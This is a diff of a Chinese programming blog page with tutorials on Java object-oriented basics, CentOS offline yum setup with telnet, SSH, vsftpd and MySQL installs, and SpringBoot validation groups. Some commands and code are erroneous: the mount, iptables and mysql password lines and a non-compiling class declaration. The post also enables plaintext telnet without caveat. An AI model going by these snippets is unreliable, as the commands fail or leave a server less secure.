+<p>那如果按上面的例子，有这么一个方法:</p>
+<pre><code class="java">public void runTeice(Person p)&#123;
+    p.run();
+    p.run();
+&#125;
+</code></pre>
+<p>它传入的参数类型是<code>Person</code>，我们是无法知道传入的参数实际类型究竟是<code>Person</code>，还是<code>Student</code>，还是<code>Person</code>的其他子类，因此，也无法确定调用的是不是<code>Person</code>类定义的<code>run()</code>方法。所以，多态的特性就是，运行期才能动态决定调用的子类方法。对某个类型调用某个方法，执行的实际方法可能是某个子类的覆写方法。这种不确定性的方法调用，究竟有什么作用？</p>
+<p>举个栗子:</p>
+<p>假设我们定义一种收入，需要给它报税，那么先定义一个<code>Income</code>类：</p>
+<pre><code class="java">class Income&#123;
+    protected double income;
+    public double getTax()&#123;
+        return income*0.1;//税率10%
+    &#125;
+&#125;
+</code></pre>
+<p>对于工资收入，可以减去一个基数，那么我们可以从<code>Income</code>派生出<code>SalaryIncome</code>，并覆写<code>getTax()</code>：</p>
+<pre><code class="java">class Salary extends Income&#123;
+    @Override
+    public double getTax() &#123;
+        if(income &lt; 5000)&#123;
+            return 0;
+        &#125;
+        return (income - 5000) * 0.1;
+    &#125;
+&#125;
+</code></pre>
+<p>如果你享受国务院特殊津贴，那么按照规定，可以全部免税：</p>
+<pre><code class="java">class StateCouncilSpecialAllowance extends Income&#123;
+    @Override
+    public double getTax() &#123;
+        return 0;
+    &#125;
+&#125;
+</code></pre>
+<p>现在，我们要编写一个报税的财务软件，对于一个人的所有收入进行报税，可以这么写：</p>
+<pre><code class="java">public double totalTax(Income... incomes) &#123;
+    double total = 0;
+    for (Income income: incomes) &#123;
+        total = total + income.getTax();
+    &#125;
+    return total;
+&#125;
+</code></pre>
+<p>整体代码:</p>
+<pre><code class="java">package com.oop.polymorphic;
+
+/**
+ * @author Administrator_Xcc
+ */
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        // 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:
+        Income[] incomes = new Income[]&#123;
+                new Income(3000),//300
+                new Salary(7500),//250
+                new StateCouncilSpecialAllowance(10000)//0
+        &#125;;
+        System.out.println(totalTax(incomes));
+    &#125;
+    public static double totalTax(Income... incomes) &#123;
+        double total = 0;
+        for (Income income: incomes) &#123;
+            total += income.getTax();
+        &#125;
+        return total;
+    &#125;
+&#125;
+class Income&#123;
+    protected double income;
+    public Income(double income)&#123;this.income = income;&#125;
+    public double getTax()&#123;
+        return income*0.1;//税率10%
+    &#125;
+&#125;
+class Salary extends Income&#123;
+    public Salary(double income) &#123;
+        super(income);
+    &#125;
+
+    @Override
+    public double getTax() &#123;
+        if(income &lt; 5000)&#123;
+            return 0;
+        &#125;
+        return (income - 5000) * 0.1;
+    &#125;
+&#125;
+class StateCouncilSpecialAllowance extends Income&#123;
+    public StateCouncilSpecialAllowance(double income) &#123;
+        super(income);
+    &#125;
+
+    @Override
+    public double getTax() &#123;
+        return 0;
+    &#125;
+&#125;
+</code></pre>
+<p>观察<code>totalTax()</code>方法：利用多态，<code>totalTax()</code>方法只需要和<code>Income</code>打交道，它完全不需要知道<code>Salary</code>和<code>StateCouncilSpecialAllowance</code>的存在，就可以正确计算出总的税。如果我们要新增一种稿费收入，只需要从<code>Income</code>派生，然后正确覆写<code>getTax()</code>方法就可以。把新的类型传入<code>totalTax()</code>，不需要修改任何代码。</p>
+<p>可见，多态具有一个非常强大的功能，就是允许添加更多类型的子类实现功能扩展，却不需要修改基于父类的代码。</p>
+<h4 id="重写Object方法"><a href="#重写Object方法" class="headerlink" title="重写Object方法"></a>重写Object方法</h4><p>Java有一个超类叫做<code>Object</code>，Object中定义了几个重要方法：</p>
+<ul>
+<li><code>toString()</code>:将实例对象以<code>String</code>输出，如不重写此方法会输出该实例内存地址</li>
+<li><code>equals()</code>:判断两个实例是否逻辑相等</li>
+<li><code>hashCode()</code>:计算实例的hash值</li>
+</ul>
+<p>在很多时候我们都会用到这几个方法:</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        Person person = new Person();
+        person.name = &quot;xcc&quot;;
+        System.out.println(person.hashCode());
+        System.out.println(person);
+    &#125;
+&#125;
+class Person&#123;
+    protected String name;
+
+    @Override
+    public int hashCode() &#123;
+        return this.name.hashCode();
+    &#125;
+
+    @Override
+    public boolean equals(Object obj) &#123;
+        if(obj instanceof Person)&#123;
+            Person p = (Person) obj;
+            return this.name.equals(p.name);
+        &#125;
+        return false;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;Person:name=&quot;+name;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="调用super方法"><a href="#调用super方法" class="headerlink" title="调用super方法"></a>调用super方法</h4><p>在子类需要调用父类被重写的方法时，可以使用<code>super</code></p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+       Person person = new Student();
+       person.name = &quot;Xcc&quot;;
+        System.out.println(person.hello());
+    &#125;
+&#125;
+class Person &#123;
+    protected String name;
+    public String hello() &#123;
+        return &quot;Hello, &quot; + name;
+    &#125;
+&#125;
+
+class Student extends Person &#123;
+@Override
+    public String hello() &#123;
+        // 调用父类的hello()方法:
+        return super.hello() + &quot;!&quot;;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h4><p>继承可以允许子类覆写父类的方法。如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为<code>final</code>。用<code>final</code>修饰的方法不能被<code>Override</code>：</p>
+<pre><code class="java">class Person&#123;
+    protected String name;
+    public final String hello()&#123;
+        return &quot;Hello&quot;+name;
+    &#125;
+&#125;
+class Student extends Person&#123;
+    
+    @Override
+    public String hello()&#123;
+        //compile error :不允许重写
+    &#125;
+&#125;
+</code></pre>
+<p>除此以外:</p>
+<ul>
+<li>一个类不想被继承，也可以在该类名前加上final</li>
+<li>一个字段的值不想被修改，可以加上final</li>
+<li><strong>可以在构造方法中初始化字段，这种方法很实用，可以保证实例一旦被创建，其被final修改的字段就不可以改变：</strong></li>
+</ul>
+<pre><code class="java">class Person&#123;
+    public final String name;
+    Person(String name)&#123;
+        //构造方法中将name初始化
+        this.name = name;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>由于多态的特性，每个子类都可以覆写父类的方法：</p>
+<pre><code class="java">class Person &#123;
+    protected String name;
+    public String hello() &#123;
+        return &quot;Hello, &quot; + name;
+    &#125;
+&#125;
+
+class Student extends Person &#123;
+@Override
+    public String hello() &#123;
+        // 调用父类的hello()方法:
+        return super.hello() + &quot;!&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>如果父类的方法没有实际意义，可否去掉方法的执行语句？</p>
+<pre><code class="java">class Person&#123;
+    public String hello();//没有执行语句
+&#125;
+</code></pre>
+<p>那么这么写肯定不行，编译会报错，可以讲&#x3D;将方法定义为抽象方法吗？</p>
+<pre><code class="java">class Person&#123;
+    public abstract String hello();//没有执行语句
+&#125;
+</code></pre>
+<p>这样子也不行，会导致Person类无法编译。</p>
+<p>这个时候抽象类的作用就出来了，把不需要写实际执行代码的方法写进抽象类，这样既可保证类正常编译，又能减轻代码量。</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216223854115.png" alt="image-20211216223854115" style="zoom:50%;" />
+
+<h4 id="面向抽象编程"><a href="#面向抽象编程" class="headerlink" title="面向抽象编程"></a>面向抽象编程</h4><p>当我们定义了抽象类<code>Person</code>，以及具体的<code>Student</code>、<code>Teacher</code>子类的时候，我们可以通过抽象类<code>Person</code>类型去引用具体的子类的实例：</p>
+<pre><code class="java">Person s = new Student();
+Person t = new Teacher();
+</code></pre>
+<p>这种引用抽象类的好处在于，我们对其进行方法调用，并不关心<code>Person</code>类型变量的具体子类型：</p>
+<pre><code class="java">//不用关心Person变量的子类类型
+t.hello();
+s.hello();
+</code></pre>
+<p>同样，如果新建一个类继承了Person，我们仍然不用关心Person类型变量的具体子类类型：</p>
+<pre><code class="java">Person e = new Employee();
+e.run();
+</code></pre>
+<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>抽象类的本质就是一个高层类，即定义一个接口规范，让继承它的类都使用同一个接口规范，如果这个抽象类中没有任何字段，所有方法都是抽象方法，那么这个类可以使用<code>接口</code>代替，也就是<code>interface</code>：</p>
+<p>abstract class:</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216224118794.png" alt="image-20211216224118794" style="zoom:50%;" />
+
+<p>interface:</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216224525393.png" alt="image-20211216224525393" style="zoom:50%;" />
+
+<p>抽象类中子类使用<code>extends</code>字段继承该类后可使用该类的所有方法，在接口中，子类需使用<code>implements</code>实现该接口：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216224830958.png" alt="image-20211216224830958" style="zoom:50%;" />
+
+<p>其次在Java中，一个类只可以继承一个类，但一个类可以实现多个接口：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216225041644.png" alt="image-20211216225041644" style="zoom:50%;" />
+
+<p>这样的话，Hello这个接口中有什么方法，Student类也必须重写该接口的方法，不然编译器就会报错：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211216225239543.png" alt="image-20211216225239543"></p>
+<p>未实现Hello接口的方法，编译器提示报错。</p>
+<h4 id="Java接口和编程接口"><a href="#Java接口和编程接口" class="headerlink" title="Java接口和编程接口"></a>Java接口和编程接口</h4><p>Java接口泛指<code>intrface</code>的定义，表示一组接口类型和一组方法签名，编程接口泛指接口规范，比如方法签名，数据格式，网络协议等。</p>
+<h4 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h4><p>Person.java</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217133240926.png" alt="image-20211217133240926" style="zoom:50%;" />
+
+<p>此时<code>Person</code>接口继承了<code>Hello</code>，<code>Hello</code>接口的方法也会一并继承下去，在有子类实现了<code>Person</code>接口时，也要一并实现<code>Hello</code>接口的方法：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217133529259.png" alt="image-20211217133529259" style="zoom:50%;" />
+
+<p>在使用时，实例化的对象永远是一个具体的子类，但总是通过接口去引用它，因为接口比抽象类更抽象：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217172801420.png" alt="image-20211217172801420" style="zoom:50%;" />
+
+<h4 id="default方法"><a href="#default方法" class="headerlink" title="default方法"></a>default方法</h4><p>在接口中，可以自定义<code>default</code>方法：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217173242630.png" alt="image-20211217173242630" style="zoom:50%;" />
+
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217173542446.png" alt="image-20211217173542446" style="zoom:50%;" />
+
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211217173711380.png" alt="image-20211217173711380" style="zoom:50%;" />
+
+<p>实现类可以不必覆写<code>default</code>方法。<code>default</code>方法的目的是，当我们需要给接口新增一个方法时，会涉及到修改全部子类。如果新增的是<code>default</code>方法，那么子类就不必全部修改，只需要在需要覆写的地方去覆写新增方法。</p>
+<p><code>default</code>方法和抽象类的普通方法是有所不同的。因为<code>interface</code>没有字段，<code>default</code>方法无法访问字段，而抽象类的普通方法可以访问实例字段。</p>
+<h3 id="静态字段和静态方法"><a href="#静态字段和静态方法" class="headerlink" title="静态字段和静态方法"></a>静态字段和静态方法</h3><p>关于静态方法，前面在方法已经轻微提到过，本章着重讲解</p>
+<h4 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a>静态字段</h4><p>在一个<code>class</code>中定义的字段，称为<code>实例字段</code>，每个实例调用时都互不干扰，但是还有一种带<code>static</code>的字段，称为<code>静态字段（static field）</code>,静态字段在内存中有一块独立的区域，所有实例都会共享该字段,举个栗子：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224185153367.png" alt="image-20211224185153367" style="zoom:50%;" />
+
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224190545524.png" alt="image-20211224190545524" style="zoom: 46%;" />
+
+
+
+<p>最终的运行结果也是：</p>
+<pre><code class="java">90
+80
+</code></pre>
+<p>原因是st1实例和st2实例都属于<code>StaticTest</code>类，<code>num</code>字段也属于<code>StaticTest</code>类，所以使用<code>st1.num=90</code>给num赋值就相当于：所有这个类的实例调用num时都是同一个值，而这个值被某个实例调用时改变后，其他实例调用同样也是这个值。虽然实例可以访问静态字段，但是它们指向的其实都是<code>StaticTest</code>的静态字段。所以，所有实例共享一个静态字段。</p>
+<p>而对于上述代码，其实更好写的方式是：</p>
+<pre><code class="java">StaticTest.num = 90;
+</code></pre>
+<p>直接拿类名调用字段看起来更清晰，也更好理解。</p>
+<h4 id="静态方法-1"><a href="#静态方法-1" class="headerlink" title="静态方法"></a>静态方法</h4><p>静态方法同样使用一个类名就可以调用，举个栗子：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224192336696.png" alt="image-20211224192336696" style="zoom:50%;" />
+
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224192403848.png" alt="image-20211224192403848" style="zoom:50%;" />
+
+<p>因为静态方法同样属于<code>StaticTest</code>类而不属于某个实例，所以静态方法无法访问实例字段及<code>this.字段</code>，静态方法只能访问静态字段，通过某个实例也可以调用静态方法，编译器会自动将实例名称变为类名，正常情况下使用实例变量调用静态方法会收到编译器的警告：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224200915126.png" alt="image-20211224200915126"></p>
+<p>虽然会警告，但是程序可以正常运行，所以建议使用<code>类名.静态方法</code></p>
+<h4 id="接口的静态字段"><a href="#接口的静态字段" class="headerlink" title="接口的静态字段"></a>接口的静态字段</h4><p>一般来讲，接口做为一种纯抽象类，它不能定义实例字段，但可以定义静态字段，但静态字段必须是<code>final</code>类型，举个栗子：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224201558286.png" alt="image-20211224201558286" style="zoom:50%;" />
+
+<p>但其实编译器会自动加上前面的关键字，所以这段代码的简写形式为：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224201658652.png" alt="image-20211224201658652" style="zoom:50%;" />
+
+<p>拓展：使用Java静态字段和静态方法统计实例创建次数：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224202607960.png" alt="image-20211224202607960" style="zoom:49%;" />
+
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224202523488.png" alt="image-20211224202523488" style="zoom:50%;" />
+
+<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><h4 id="包名的定义规范"><a href="#包名的定义规范" class="headerlink" title="包名的定义规范"></a>包名的定义规范</h4><p>包名在定义时，一般使用项目域名的倒置写法，比如有一个web项目的域名是:<code>https://xccit.io</code>,那么这个项目的包名在命名时，就是这样的：<code>io.xccit.*</code></p>
+<p>在后面使用<code>MVC</code>开发模式时，会有分层开发模式，而这个时候包名就会这么写：</p>
+<p>M层：<code>io.xccit.model</code>(大多数会使用dao，这儿是举个栗子)</p>
+<p>V层：<code>io.xccit.view</code></p>
+<p>C层：<code>io.xccit.controller</code></p>
+<p>看下我在举个栗子的时候写的包名：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224203456444.png" alt="image-20211224203456444"></p>
+<p>项目名为：JavaSE</p>
+<p>包名顶层为:com</p>
+<p>com下有2个包：<code>base </code> <code>oop</code></p>
+<p>base下只有三个类</p>
+<p>oop下又有5个包：<code>base</code> <code>extend</code> <code>interfaces</code> <code>polymorphic</code> <code>statictest</code></p>
+<p>这些包层层深入，里面有不同的类，类与类之间可以根据权限修饰符互相访问</p>
+<p>参考另一个web项目的包：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224204009559.png" alt="image-20211224204009559"></p>
+<h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><h4 id="内部类-1"><a href="#内部类-1" class="headerlink" title="内部类"></a>内部类</h4><p>一个类定义在另一个类的内部，这个类就叫做内部类：</p>
+<img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211224205315948.png" alt="image-20211224205315948" style="zoom:50%;" />
+
+<p>这里可以发现Outer十一个正常存在的类，而Inner是一个内部类，内部类必须依附外围的内存在，也就是Outer，这里可以看到Inner在创建时前面还有一个<code>Outer.</code>，而且创建后的<code>inner</code>实例成功访问到了Outer的<code>private</code>字段，因为Inner在Outer内部，所以可以访问Outer中使用<code>private</code>修饰的字段和方法。</p>
+<h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h4><p>还有一种定义内部类的方法，它不需要在<code>Outer</code>中明确定义，而是在<code>Outer</code>的方法中通过<code>匿名内部类</code>来定义：</p>
+<pre><code class="java">public class InnerTest()&#123;
+    public static void main(String args[])&#123;
+        new Outer(&quot;xccit&quot;).asyncHello();
+    &#125;
+    class Outer&#123;
+    private String name;
+    public Outer(String name)&#123;
+        this.name = name;
+    &#125;
+
+    void asyncHello()&#123;
+        Runnable r = new Runnable()&#123;
+            @Override
+            public void run()&#123;
+                System.out.println(&quot;Hello &quot;+Outer.this.name);
+            &#125;
+        &#125;;
+        new Thread(r).start();
+    &#125;
+&#125;
+&#125;
+</code></pre>
+<p>通过实现一个<code>Runnable</code>接口的实例来体现出匿名内部类。</p>
+<p>除此之外，匿名内部类还可以继承自普通类：</p>
+<pre><code class="java">public class InnerTest &#123;
+    public static void main(String[] args) &#123;
+        HashMap&lt;String, Object&gt; map1 = new HashMap&lt;&gt;();
+        HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;()&#123;&#125;;//匿名类
+        HashMap&lt;String, Object&gt; map3 = new HashMap&lt;&gt;()&#123;
+            &#123;
+                put(&quot;Key1&quot;,&quot;Value1&quot;);
+                put(&quot;Key2&quot;,&quot;Value2&quot;);
+                put(&quot;Key3&quot;,&quot;Value3&quot;);
+            &#125;
+        &#125;;
+        System.out.println(map3.get(&quot;Key1&quot;));
+    &#125;
+&#125;
+</code></pre>
+<h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><p>静态内部类是在原来内部类的基础上加了<code>static</code>关键字，它不再依附于<code>Outer</code>，所以不会再使用<code>Outer.this</code>来引用，并且它还可以访问Outer的private静态字段和方法，但作用域仅在<code>Outer</code>类。</p>
+<pre><code class="java">/**
+ * 测试静态内部类
+ * @author xccit
+ */
+public class StaticInnerClass &#123;
+    public static void main(String[] args) &#123;
+        Outerr.Innerr in = new Outerr.Innerr();
+        in.sayHello();
+    &#125;
+&#125;
+
+class Outerr&#123;
+    static String NAME = &quot;xccit&quot;;
+    private String name;
+    public Outerr(String name)&#123;
+        this.name = name;
+    &#125;
+
+    static class Innerr&#123;
+        void sayHello()&#123;
+            System.out.println(&quot;Hello &quot;+Outerr.NAME);
+        &#125;
+    &#125;
+
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Java/" style="color: #03a9f4">Java</a>
+        </span>
+        
+    </div>
+    <a href="/2024/08/08/Java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
 </div>
 
-          
-            <!-- scripts list from theme config.yml -->
+<div class="post">
+    <a href="/2024/08/08/Linux%E6%8C%82%E8%BD%BD%E5%85%89%E7%9B%98%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/">
+        <h2 class="post-title">Linux挂载光盘安装软件</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/8
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
             
-              <script src="/js/MiHoYo.js"></script>
-              
-                
+            <h1 id="挂载光盘安装Linux软件包"><a href="#挂载光盘安装Linux软件包" class="headerlink" title="挂载光盘安装Linux软件包"></a>挂载光盘安装Linux软件包</h1><pre><code class="shell">mkdir /media/CentOS
+mount -t /dev/cdrom /media/CentOS
+df -HT
+cd /etc/yum.repos.d/
+mkdir ./bak
+mv ./*.repo ./bak/
+cp ./bak/CentOS-Media.repo .
+vim CentOS-Media.repo
+</code></pre>
+<p>更改后的文件:</p>
+<pre><code class="shell"># CentOS-Media.repo
+#
+#  This repo can be used with mounted DVD media, verify the mount point for
+#  CentOS-7.  You can use this repo and yum to install items directly off the
+#  DVD ISO that we release.
+#
+# To use this repo, put in your DVD and use it with the other repos too:
+#  yum --enablerepo=c7-media [command]
+#  
+# or for ONLY the media repo, do this:
+#
+#  yum --disablerepo=\* --enablerepo=c7-media [command]
 
-  </body>
+[c7-media]
+name=CentOS-$releasever - Media
+baseurl=file:///media/CentOS7/  ---需要改的地方，挂载的光驱
+gpgcheck=1
+enabled=1 ---从0改到1开启光驱
+gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7
 
-  </html>
+~                                                                               
+~                                                                               
+~                                                
+</code></pre>
+<p> 依次执行以下命令:  </p>
+<pre><code class="shell">yum clean all
+yum repolist
+yum install ftp
+</code></pre>
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><pre><code class="shell">yum install telnet telnet-server xinetd
+service xinetd start
+vim /etc/xinetd.d/telnet
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210415185927765.png" alt="image-20210415185927765"></p>
+<pre><code class="shell">service xinetd restart
+</code></pre>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><pre><code class="shell">yum install sshd  / openssh*
+service sshd start
+</code></pre>
+<h2 id="Vsftpd"><a href="#Vsftpd" class="headerlink" title="Vsftpd"></a>Vsftpd</h2><pre><code class="shell">yum install vsftpd
+service vsftpd start
+iptables -I INPUT -p tcp 21 --dport -j ACCEPT
+iptables -I INPUT -p udp 21 --dport -j ACCEPT
+vim /etc/vsftpd/vsftpd.conf,修改anonymous_enable = NO  --禁止匿名用户登陆
+去掉chroot_local_user = yes前的注释，限制用户访问家目录之外的地方
+</code></pre>
+<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><pre><code class="shell">yum install mysql mysql-server mysql-devel
+service mysqld start
+mysql -u root password &#39;password&#39;   --给mysql的root用户设置密码
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Linux/" style="color: #00a596">Linux</a>
+        </span>
+        
+    </div>
+    <a href="/2024/08/08/Linux%E6%8C%82%E8%BD%BD%E5%85%89%E7%9B%98%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/08/05/SpringBoot-validation%E5%A6%82%E4%BD%95%E5%88%86%E7%BB%84%E6%A0%A1%E9%AA%8C/">
+        <h2 class="post-title">SpringBoot-validation如何分组校验</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="SpringBoot-validation如何分组校验"><a href="#SpringBoot-validation如何分组校验" class="headerlink" title="SpringBoot-validation如何分组校验"></a>SpringBoot-validation如何分组校验</h1><h2 id="1-分组校验的场景"><a href="#1-分组校验的场景" class="headerlink" title="1.分组校验的场景"></a>1.分组校验的场景</h2><p><code>实体类:</code></p>
+<pre><code class="java">/**
+* 
+* @TableName category
+*/
+public class Category implements Serializable &#123;
+
+
+    /**
+    * ID
+    */
+    @NotNull(message=&quot;[ID]不能为空&quot;)
+    @ApiModelProperty(&quot;ID&quot;)
+    private Integer id;
+    /**
+    * 分类名称
+    */
+    @NotBlank(message=&quot;[分类名称]不能为空&quot;)
+    @Size(max= 32,message=&quot;编码长度不能超过32&quot;)
+    @ApiModelProperty(&quot;分类名称&quot;)
+    @Length(max= 32,message=&quot;编码长度不能超过32&quot;)
+    private String categoryName;
+    /**
+    * 分类别名
+    */
+    @NotBlank(message=&quot;[分类别名]不能为空&quot;)
+    @Size(max= 32,message=&quot;编码长度不能超过32&quot;)
+    @ApiModelProperty(&quot;分类别名&quot;)
+    @Length(max= 32,message=&quot;编码长度不能超过32&quot;)
+    private String categoryAlias;
+    /**
+    * 创建人ID
+    */
+    @ApiModelProperty(&quot;创建人ID&quot;)
+    private Integer createUser;
+    /**
+    * 创建时间
+    */
+    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;,timezone = &quot;GMT+8&quot;)
+    @ApiModelProperty(&quot;创建时间&quot;)
+    private LocalDateTime createTime;
+    /**
+    * 修改时间
+    */
+    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;,timezone = &quot;GMT+8&quot;)
+    @ApiModelProperty(&quot;修改时间&quot;)
+    private LocalDateTime updateTime;
+
+    /**
+    * ID
+    */
+    public void setId(Integer id)&#123;
+    this.id = id;
+    &#125;
+
+    /**
+    * 分类名称
+    */
+    public void setCategoryName(String categoryName)&#123;
+    this.categoryName = categoryName;
+    &#125;
+
+    /**
+    * 分类别名
+    */
+    public void setCategoryAlias(String categoryAlias)&#123;
+    this.categoryAlias = categoryAlias;
+    &#125;
+
+    /**
+    * 创建人ID
+    */
+    public void setCreateUser(Integer createUser)&#123;
+    this.createUser = createUser;
+    &#125;
+
+    /**
+    * 创建时间
+    */
+    public void setCreateTime(LocalDateTime createTime)&#123;
+    this.createTime = createTime;
+    &#125;
+
+    /**
+    * 修改时间
+    */
+    public void setUpdateTime(LocalDateTime updateTime)&#123;
+    this.updateTime = updateTime;
+    &#125;
+
+
+    /**
+    * ID
+    */
+    public Integer getId()&#123;
+    return this.id;
+    &#125;
+
+    /**
+    * 分类名称
+    */
+    public String getCategoryName()&#123;
+    return this.categoryName;
+    &#125;
+
+    /**
+    * 分类别名
+    */
+    public String getCategoryAlias()&#123;
+    return this.categoryAlias;
+    &#125;
+
+    /**
+    * 创建人ID
+    */
+    public Integer getCreateUser()&#123;
+    return this.createUser;
+    &#125;
+
+    /**
+    * 创建时间
+    */
+    public LocalDateTime getCreateTime()&#123;
+    return this.createTime;
+    &#125;
+
+    /**
+    * 修改时间
+    */
+    public LocalDateTime getUpdateTime()&#123;
+    return this.updateTime;
+    &#125;
+
+    @Override
+    public String toString() &#123;
+        return &quot;Category&#123;&quot; +
+                &quot;id=&quot; + id +
+                &quot;, categoryName=&#39;&quot; + categoryName + &#39;\&#39;&#39; +
+                &quot;, categoryAlias=&#39;&quot; + categoryAlias + &#39;\&#39;&#39; +
+                &quot;, createUser=&quot; + createUser +
+                &quot;, createTime=&quot; + createTime +
+                &quot;, updateTime=&quot; + updateTime +
+                &#39;&#125;&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p><strong>上面的实体类定义中,通过使用注解的方式来开启对各个字段的值进行校验,不符合规则的值将会通过抛异常的方式返回前端</strong></p>
+<p><code>再来看Controller</code></p>
+<pre><code class="java">/**
+     * 添加分类
+     * @param category
+     * @return
+     */
+    @Operation(summary = &quot;添加分类&quot;)
+    @PostMapping()
+    public AjaxResult insert(@RequestBody @Validated Category category) &#123;
+        categoryService.insert(category);
+        return AjaxResult.success(AjaxHttpStatus.SUCCESS);
+    &#125;
+
+    /**
+     * 修改分类
+     * @param category
+     * @return
+     */
+    @Operation(summary = &quot;修改分类&quot;)
+    @PutMapping
+    public AjaxResult update(@RequestBody @Validated Category category) &#123;
+        categoryService.update(category);
+        return AjaxResult.success(AjaxHttpStatus.SUCCESS);
+    &#125;
+</code></pre>
+<p>**通过<code>@Validated</code>**注解开启校验规则,但是我们需要看两个请求的场景:</p>
+<h3 id="1-1-修改"><a href="#1-1-修改" class="headerlink" title="1.1 修改"></a>1.1 修改</h3><p>修改接口中，我们需要使用到实体类的主键ID进行修改，那实体类中id字段上面的@NotNull貌似是合理的，我们看结果：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805131959778.png" alt="image-20240805131959778"></p>
+<h3 id="1-2-添加"><a href="#1-2-添加" class="headerlink" title="1.2 添加"></a>1.2 添加</h3><p>在添加接口中，我们肯定是不会传ID的，毕竟数据库里面ID排到了多少，加上我们可能还会进行删除等测试，那ID谁又能知道是多少。</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805132401050.png" alt="image-20240805132401050"></p>
+<p>这里捕获到了异常：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805132516315.png" alt="image-20240805132516315"></p>
+<pre><code class="java">    @ExceptionHandler(ConstraintViolationException.class)
+    @ResponseStatus(HttpStatus.BAD_REQUEST)
